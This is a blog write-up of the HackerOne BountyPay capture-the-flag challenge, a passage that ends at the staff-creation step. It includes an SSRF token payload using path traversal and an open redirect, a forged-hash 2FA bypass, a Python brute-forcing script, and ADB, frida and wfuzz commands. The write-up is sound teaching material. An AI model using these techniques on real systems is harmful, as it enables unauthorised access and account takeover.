<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="HackerOne-2006 CTF WriteupAfter playing quite an amount of CTFs till date, I can really say that this was one of the extraordinary ones and it is quite visible once you consider the magnitude of logic">
<meta name="keywords" content="CTF,WebSecurity,Hacking">
<meta property="og:type" content="article">
<meta property="og:title" content="HackerOne-2006 CTF Writeup">
<meta property="og:url" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/index.html">
<meta property="og:site_name" content="CaptainFreak">
<meta property="og:description" content="HackerOne-2006 CTF WriteupAfter playing quite an amount of CTFs till date, I can really say that this was one of the extraordinary ones and it is quite visible once you consider the magnitude of logic">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/tldr.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/scope.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/git.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/ssrf.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/activity2.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/activity3.1.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/activity3.2.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/get_staff.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/post_staff.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/found_post_param.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/bp_tweet.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/id_sandra.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/simult-temp.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/marten_creds.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/meme.jpg">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/style_post.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/collab.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/ngrok_exfill.png">
<meta property="og:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/flag.png">
<meta property="og:updated_time" content="2021-01-23T08:30:55.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="HackerOne-2006 CTF Writeup">
<meta name="twitter:description" content="HackerOne-2006 CTF WriteupAfter playing quite an amount of CTFs till date, I can really say that this was one of the extraordinary ones and it is quite visible once you consider the magnitude of logic">
<meta name="twitter:image" content="https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/tldr.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>HackerOne-2006 CTF Writeup</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&text=HackerOne-2006 CTF Writeup"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&is_video=false&description=HackerOne-2006 CTF Writeup"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackerOne-2006 CTF Writeup&body=Check out this article: https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&name=HackerOne-2006 CTF Writeup&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HackerOne-2006-CTF-Writeup"><span class="toc-number">1.</span> <span class="toc-text">HackerOne-2006 CTF Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Index"><span class="toc-number">1.1.</span> <span class="toc-text">Index</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Recon"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exposed-git-directory"><span class="toc-number">1.3.</span> <span class="toc-text">Exposed .git directory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-2FA-Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Login 2FA Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Side-Request-Forgery"><span class="toc-number">1.5.</span> <span class="toc-text">Server Side Request Forgery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Android-Challenges"><span class="toc-number">1.6.</span> <span class="toc-text">Android Challenges</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-OSINT"><span class="toc-number">1.7.</span> <span class="toc-text">API + OSINT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stealing-Payment-2FA-Code-using-CSS"><span class="toc-number">1.9.</span> <span class="toc-text">Stealing Payment 2FA Code using CSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSS-can-Compute"><span class="toc-number">1.9.1.</span> <span class="toc-text">CSS can Compute!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-End"><span class="toc-number">1.10.</span> <span class="toc-text">The End</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackerOne-2006 CTF Writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">CaptainFreak</span>
      </span>
      
    <div class="postdate">
        <time datetime="2020-06-19T10:07:25.000Z" itemprop="datePublished">2020-06-19</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/">CTF</a>, <a class="tag-link" href="/tags/Hacking/">Hacking</a>, <a class="tag-link" href="/tags/WebSecurity/">WebSecurity</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="HackerOne-2006-CTF-Writeup"><a href="#HackerOne-2006-CTF-Writeup" class="headerlink" title="HackerOne-2006 CTF Writeup"></a>HackerOne-2006 CTF Writeup</h1><p>After playing quite an amount of CTFs till date, I can really say that this was one of the extraordinary ones and it is quite visible once you consider the magnitude of logical deductions it required to follow the right path and not the rabbit holes and the effort taken in arranging the stable infrastructure required. Thanks, Hackerone, and the Authors for amazing 24 hours of intellectual satisfaction which was much needed in the lockdown. It felt good to be in the <a href="https://twitter.com/adamtlangley/status/1266983209994199040?s=20" target="_blank" rel="noopener">Top 5s to crack this</a>. </p>
<p>An Unorthodox CTF requires an Unorthodox writeup hence it will be a summarised walkthrough of my thought process. The Hackerone Report submiited can be found here <a href="https://hackerone.com/reports/887766" target="_blank" rel="noopener">#887766</a></p>
<p>For the people who actively tried and could not solve till the end, an illustrative TL;DR will be fine:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/tldr.png" title="TLDR">
<p>In a nutshell, Solution has 8 steps:</p>
<h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><ol>
<li>Initial Recon</li>
<li>Exposed .git directory</li>
<li>Login 2FA Bypass</li>
<li>Server-Side Request Forgery</li>
<li>Android Challenges</li>
<li>API + OSINT</li>
<li>Privilege Escalation</li>
<li>Stealing Payment 2FA Code using CSS</li>
</ol>
<h2 id="Initial-Recon"><a href="#Initial-Recon" class="headerlink" title="Initial Recon"></a>Initial Recon</h2><p>As soon as hacker sees the <strong>*wildcard</strong>,</p>
<p><img src="./scope.png" alt=""></p>
<p>We do Recon &amp; <a href="https://github.com/projectdiscovery/subfinder" target="_blank" rel="noopener">Subfinder</a> yeilds:</p>
<table>
<thead>
<tr>
<th>SubDomains</th>
<th>Notes Taken</th>
</tr>
</thead>
<tbody>
<tr>
<td>bountypay.h1ctf.com</td>
<td>Static Home Page.</td>
</tr>
<tr>
<td>app.bountypay.h1ctf.com</td>
<td>For Customers Use, Marten is one of em.</td>
</tr>
<tr>
<td>staff.bountypay.h1ctf.com</td>
<td>For BountyPay employees probably.</td>
</tr>
<tr>
<td>api.bountypay.h1ctf.com</td>
<td>Hmm, The API service for above two. Has <strong>Open Redirect</strong>, Might be for chaining later🤔</td>
</tr>
<tr>
<td>software.bountypay.h1ctf.com</td>
<td>Interesting one, Can’t be accessed directly due to IP whitelist, I smell <strong>SSRF</strong>.</td>
</tr>
</tbody>
</table>
<p>In the text ahead, I will address the subdomains as separate entities (Ex. app.bountypay.h1ctf.com will be just <code>App</code>)</p>
<h2 id="Exposed-git-directory"><a href="#Exposed-git-directory" class="headerlink" title="Exposed .git directory"></a>Exposed .git directory</h2><p>After trying usual bugs of Auth Bypass in attempts to login into App and Staff, we are just left with more content discovery, and doing usual <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/git.png" title="git">
<p>We find that some part of the .git directory is exposed on App for us to analyze. Looking into these files, we get a reference to a public Github Repo of BountyPay(<a href="https://github.com/bounty-pay-code/request-logger.git" target="_blank" rel="noopener">bounty-pay-code/request-logger</a>). This repo leaks a path(<a href="https://app.bountypay.h1ctf.com/bp_web_trace.log" target="_blank" rel="noopener">/bp_web_trace.log</a>) where logs are stored for the App. The logs contain login credentials of a BountyPay Customer Brian Oliver(<strong>brian.oliver:V7h0inzX</strong>). Now we have a session on App I guess.</p>
<h2 id="Login-2FA-Bypass"><a href="#Login-2FA-Bypass" class="headerlink" title="Login 2FA Bypass"></a>Login 2FA Bypass</h2><p>No No, Not so fast! BountyPay is secure. They have Login 2FA to save their customers 🙃. The App sends a 2FA code to the customer’s phone.</p>
<p>The POST request for submitting 2FA code had 4 parameters.<br>Username, Password, <strong>Challenge</strong> &amp; <strong>Challenge_Answer</strong>.</p>
<p>The Challenge_Answer param is supposed to be the 2FA code. In the very first attempt after verifying that the weird Challenge Param is of length 32, I sort of guessed that this is <strong>md5 of answer</strong> and as the App is taking this from client-side, we might be able to submit <strong>our own challenge according to our own answer</strong> and fool the App, and BOOM. It just worked. Now we are logged In with Brian’s Creds on the App.</p>
<h2 id="Server-Side-Request-Forgery"><a href="#Server-Side-Request-Forgery" class="headerlink" title="Server Side Request Forgery"></a>Server Side Request Forgery</h2><p>POST-Succesfull Auth, App creates a Base64 encoded JSON cookie: <code>token</code>,  which after decoding looks like:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"account_id"</span>:<span class="string">"F8gHiqSdpK"</span>,<span class="attr">"hash"</span>:<span class="string">"de235bffd23df6995ad4e0930baac1a2"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>After fuzzing both params, we come to know that App is using <code>hash</code> for the session and <code>account_id</code> for creating URI for the server-side request to API endpoint for getting the Bounty Payment data for Brian’s account_id <code>F8gHiqSdpK</code>(App very generously gives away the endpoint in the HTTP response of /statements?month=05&amp;year=2020)</p>
<p>(<a href="https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=05&amp;year=2020" target="_blank" rel="noopener">https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=05&amp;year=2020</a>)<br><em>Note: Direct access to this endpoint is not possible, there is some secret token added by App.</em> </p>
<p>Remember the notes from Recon? Software is not accessible due to whitelist and Api has Open Redirect.</p>
<p>To reach the Software we need SSRF and to get that, we have:</p>
<ol>
<li>Injection point(/api/accounts/<code>account_id</code>) in URI to Api</li>
<li>OpenRedirect(/redirect?url=) on Api to make the request go to wherever we want.</li>
</ol>
<p>What we dont have yet is traversal in URI to reach /redirect from /api/account/account_id and <code>account_id=../../redirect?url=software# might just work</code>.</p>
<p>After testing the theory, it just worked!<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"account_id"</span>:<span class="string">"../../redirect/?url=https://software.bountypay.h1ctf.com/#"</span>,<span class="attr">"hash"</span>:<span class="string">"de235bffd23df6995ad4e0930baac1a2"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>We have full-blown SSRF now and we can reach the Software. 💥</strong> </p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/ssrf.png" title="ssrf">
<p>But there is nothing interesting on it. 😕 The HTML on Software only had one standard Login form with POST method:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"text-align: center"</span>&gt;</span>Software Storage<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span> <span class="attr">style</span>=<span class="string">"margin-top:50px"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"margin-top:7px"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"margin-top:7px"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-success pull-right"</span> <span class="attr">value</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>We just have GET SSRF and we can’t issue POST SSRF, After trying Scenarios like CRLF, etc. and not getting anything, this SSRF felt almost useless for quite some time. But I was sure that it is meant to hit Software in the scenario. I learned from the initial Login step on App that, If we don’t have Hint to move forward, all we can do is content discovery 🙂. Hence wrote a small python script to do Directory brute-force on Software using this SSRF.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"https://app.bountypay.h1ctf.com:443/statements?month=04&amp;year=2020"</span></span><br><span class="line"></span><br><span class="line">dirs = open(<span class="string">"common-directories.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> dirs:</span><br><span class="line">  token = <span class="string">'&#123;"account_id":"../../redirect/?url=https://software.bountypay.h1ctf.com/'</span>+d+<span class="string">'#","hash":"de235bffd23df6995ad4e0930baac1a2"&#125;'</span></span><br><span class="line">  token = base64.b64encode(token)</span><br><span class="line">  burp0_cookies = &#123;<span class="string">"token"</span>: token&#125;</span><br><span class="line">  data = requests.get(burp0_url,cookies=burp0_cookies).text</span><br><span class="line">  <span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>
<p>And on <a href="https://software.bountypay.h1ctf.com/uploads" target="_blank" rel="noopener">https://software.bountypay.h1ctf.com/uploads</a> we get:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /uploads/<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"white"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /uploads/<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"../"</span>&gt;</span>../<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/uploads/BountyPay.apk"</span>&gt;</span>BountyPay.apk<span class="tag">&lt;/<span class="name">a</span>&gt;</span>                                        20-Apr-2020 11:264043701<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>A link to an Android APK! <a href="https://software.bountypay.h1ctf.com/uploads/BountyPay.apk" target="_blank" rel="noopener">https://software.bountypay.h1ctf.com/uploads/BountyPay.apk</a> which is directly accessible  😁. Now we download this APK and start analyzing. Turns out it is corrupted. I hackily tried to Fix the corruption, At some point, I even considered to fix this by reading all about PZip. Some cool references:</p>
<ol>
<li><a href="https://fadec0d3.blogspot.com/2017/04/plaidctf-2017-zipper-50.html" target="_blank" rel="noopener">https://fadec0d3.blogspot.com/2017/04/plaidctf-2017-zipper-50.html</a></li>
<li><a href="https://git.zx2c4.com/BruteZip/about/" target="_blank" rel="noopener">https://git.zx2c4.com/BruteZip/about/</a></li>
</ol>
<p>But, After banging my head for some hours, I got to know that I was one of the <strong>unfortunates to reach this step too early</strong>, As it was not intentional to give corrupted APK. Thanks to <a href="https://twitter.com/bbuerhaus" target="_blank" rel="noopener">@Ziot</a> on Hacker101 discord for letting me know that they have fixed the issue and later nahamsec also <a href="https://twitter.com/NahamSec/status/1266586955849953281" target="_blank" rel="noopener">tweeted</a> out about it. But I would have definitely played for hours with corrupted APK if Ziot had not notified.</p>
<h2 id="Android-Challenges"><a href="#Android-Challenges" class="headerlink" title="Android Challenges"></a>Android Challenges</h2><p>Reversing and analyzing the BountyPay App’s <code>AndroidManifest.xml</code> and Source Code, We get two know that there are 5 activities:</p>
<table>
<thead>
<tr>
<th>Activity</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td>MainActivity</td>
<td>A form that takes Twitter Handle and Username for analytics.</td>
</tr>
<tr>
<td>PartOneActivity</td>
<td>The Activity code Checks if it was opened through DeepLink URI having scheme = <strong><code>one</code></strong> and host = <strong><code>part</code></strong> and has parameter <strong><code>start</code></strong> = <strong><code>PartTwoActivity</code></strong>,  If yes, then it stores that PartOne is solved and starts <code>PartTwoActivity</code>. ADB command to achieve above: <strong>$ adb shell am start -d one://part?start=PartTwoActivity</strong></td>
</tr>
<tr>
<td>PartTwoActivity</td>
<td>Similary this activty too requires a deeplink to solve: <strong>$ adb shell am start -d “two://part?two=light\&amp;switch=on”</strong>. After that, it makes a text Field and submit button visible. When we submit this form, it compares the String Value from text field with the one it fetched from DataSnapshot. If it is equal then we solve this step and it fires <code>PartThreeActivity</code>. We get this value to be <strong><code>X-Token</code></strong>, I used frida hook to <strong>dump the Strings which are being compared</strong> using handy <a href="https://github.com/iddoeldor/frida-snippets/blob/master/scripts/log_string_builders_and_string_compare.js" target="_blank" rel="noopener">frida-snippet</a>. <strong>$ frida -U -f bounty.pay -l ./frida-snippet.js –no-paus</strong> <img src="./activity2.png" alt=""></td>
</tr>
<tr>
<td></td>
</tr>
<tr>
<td>PartThreeActivity</td>
<td>This step too expects us to deduce the DeepLink from SourceCode analysis. It turn out to be: <strong>\$ adb shell am start -d “three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&amp;<br>switch=b24=\&amp;header=X-Token”</strong> where params are, <code>three = base64(&quot;PartThreeActivity&quot;)</code>, <code>switch = base64(&quot;on&quot;)</code> \&amp; <code>header=X-Token</code>. It then makes a form visible which expects us to submit a valid Hash, we can again dump it out with same <code>frida-snippet</code> as in step two. Hash: <img src="./activity3.1.png" alt=""> After we submit this hash, App fires a POST request and leaks the Host \&amp; Header in logs: <img src="./activity3.2.png" alt=""></td>
</tr>
<tr>
<td>CongratsActivity</td>
<td>It congratulates after solving above 3 steps in sequence! Now we have the <strong>token!</strong> which we did not ealier. This <code>X-Token</code> can be used to <strong>directly access the Api</strong>.</td>
</tr>
</tbody>
</table>
<h2 id="API-OSINT"><a href="#API-OSINT" class="headerlink" title="API + OSINT"></a>API + OSINT</h2><p>Now, we have a hint to work on Api with given <code>X-token</code>. From <code>/statements</code> endpoint on App we know that Api hosts a REST api on <code>/api/*</code>. With this much of little information, a hacker always is left with nothing to do other than more content discovery 🙂. I fuzzed for API docs/more endpoints on <code>/*</code> and <code>/api/*</code> on <code>api.bountypay.h1ctf.com</code> in a hope to see some hidden endpoints and yep, we do get the hit on <code>/api/staff</code>!</p>
<p><strong>\$ wfuzz –hc 404 -H “X-Token: 8e9998ee3137ca9ade8f372739f062c1” -w wordlist/general/common.txt <a href="https://api.bountypay.h1ctf.com/api/FUZZ" target="_blank" rel="noopener">https://api.bountypay.h1ctf.com/api/FUZZ</a></strong></p>
<p>This confirms that we are on the right path! 😪</p>
<p><a href="https://api.bountypay.h1ctf.com/api/staff" target="_blank" rel="noopener">https://api.bountypay.h1ctf.com/api/staff</a> gives us something interesting:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/get_staff.png" title="staff">
<p>And standard REST Api tests of finding more valid METHODS, Parameters on this endpoint yields:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/post_staff.png" title="staff">
<p>Now we need to find what parameter we are missing and from where it is missing (GET/POST/Content-Type?). </p>
<p>By REST Api constructs we easily can assume that if <code>GET /api/staff</code> gets staff array, then <code>POST /api/staff</code> must be used for Creating new staff object. So let’s pass it the parameters related to staff. After some time of fuzzing and passing parameters like <code>name</code>, <code>username</code>, <code>staff_id</code> in GET queries \&amp; POST body with different content types, we end up with:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/found_post_param.png" title="staff">
<p>So this indeed is how a valid staff creation POST request looks like! Now we just need to create one account for ourselves. </p>
